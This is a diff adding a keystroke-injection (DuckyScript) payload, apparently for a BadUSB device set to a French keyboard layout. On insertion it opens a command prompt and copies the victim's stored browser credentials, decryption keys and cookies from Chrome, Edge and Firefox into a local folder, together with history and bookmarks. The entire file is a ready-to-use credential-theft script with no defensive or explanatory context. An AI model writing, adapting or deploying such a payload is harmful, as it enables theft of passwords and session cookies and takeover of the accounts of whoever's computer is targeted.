@@ -1,0 +1,117 @@
+LOCALE FR
+DELAY 2000
+GUI r
+DELAY 500
+DELETE
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING mkdir BrowserInfo
+DELAY 500
+ENTER
+DELAY 500
+STRING cd BrowserInfo
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir Google
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir Firefox
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir Edge
+DELAY 500
+ENTER
+DELAY 500
+STRING cd ../
+DELAY 500
+ENTER
+DELAY 500
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\Bookmarks" BrowserInfo\Google
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\History" BrowserInfo\Google
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\Shortcuts" BrowserInfo\Google
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\Login Data" BrowserInfo\Google
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\Local State" BrowserInfo\Google
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\Cookies" BrowserInfo\Google
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" BrowserInfo\Edge
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Microsoft\Edge\User Data\Default\History" BrowserInfo\Edge
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Microsoft\Edge\User Data\Default\Shortcuts" BrowserInfo\Edge
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Microsoft\Edge\User Data\Default\Login Data" BrowserInfo\Edge
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy "AppData\Local\Microsoft\Edge\User Data\Default\Local State" BrowserInfo\Edge
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy AppData\Roaming\Mozilla\Firefox\Profiles\
+DELAY 500
+TAB
+DELAY 500
+STRING \cookies.sqlite BrowserInfo\Firefox
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy AppData\Roaming\Mozilla\Firefox\Profiles\
+DELAY 500
+TAB
+DELAY 500
+STRING \logins.json BrowserInfo\Firefox
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy AppData\Roaming\Mozilla\Firefox\Profiles\
+DELAY 500
+TAB
+DELAY 500
+STRING \key4.db BrowserInfo\Firefox
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy AppData\Roaming\Mozilla\Firefox\Profiles\
+DELAY 500
+TAB
+DELAY 500
+STRING \bookmarkbackups\b
+DELAY 500
+TAB
+DELAY 500
+STRING  BrowserInfo\Firefox
+DELAY 500
+ENTER
+DELAY 1000
+STRING exit
+DELAY 500
+ENTER
